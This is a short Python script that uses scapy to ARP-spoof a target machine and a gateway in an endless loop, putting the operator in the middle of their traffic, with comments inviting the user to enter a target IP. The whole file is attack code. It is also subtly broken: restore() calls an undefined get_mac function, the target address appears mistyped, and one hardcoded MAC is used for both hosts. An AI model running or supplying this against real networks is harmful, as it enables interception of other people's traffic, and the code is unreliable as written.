import scapy.all as scapy
import time


def spoof(target_ip, spoof_ip):
    destinationMac = "8E:86:D7:7B:1F:73"
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=destinationMac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(
        op=2,
        pdst=destination_ip,
        hwdst=destination_mac,
        psrc=source_ip,
        hwsrc=source_mac,
    )
    scapy.send(packet, verbose=False)


target_ip = "192.169.0.100"  # Enter your target IP
gateway_ip = "192.168.0.1"  # Enter your gateway's IP

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent " + str(sent_packets_count), end="")
        time.sleep(2)  # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
